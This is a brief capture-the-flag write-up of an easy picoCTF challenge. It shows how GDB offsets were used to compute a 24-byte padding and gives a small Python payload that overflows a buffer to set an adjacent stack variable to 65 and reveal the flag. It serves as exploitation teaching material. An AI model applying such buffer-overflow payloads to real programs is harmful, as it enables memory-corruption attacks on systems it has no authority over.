# Local Variable Overwrite

**Platform:** picoCTF  
**Technique:** Stack Variable Overwrite  
**Difficulty:** Easy  

## Challenge Description

A simple buffer overflow where we need to overwrite a local variable to a specific value. No return address hijacking — just changing a variable on the stack.

## Vulnerability

The program has a buffer near a local variable. By writing past the buffer, we can overwrite that variable.

## Exploitation

### Step 1: Find the Variable Location

Using GDB, I found the target variable at `rbp-0x08`. The buffer was located at `rbp-0x20`.

### Step 2: Calculate the Offset
Buffer start: rbp-0x20
Target variable: rbp-0x08
Offset = 0x20 - 0x08 = 24 bytes

text

### Step 3: Craft the Payload

```python
padding = b'A' * 24      # fill buffer and reach variable
target_value = p32(65)   # 0x41 in 32-bit packing
payload = padding + target_value
```
Step 4: Trigger
Send the payload. The variable is overwritten with 0x41 (65 decimal). The program prints the flag.
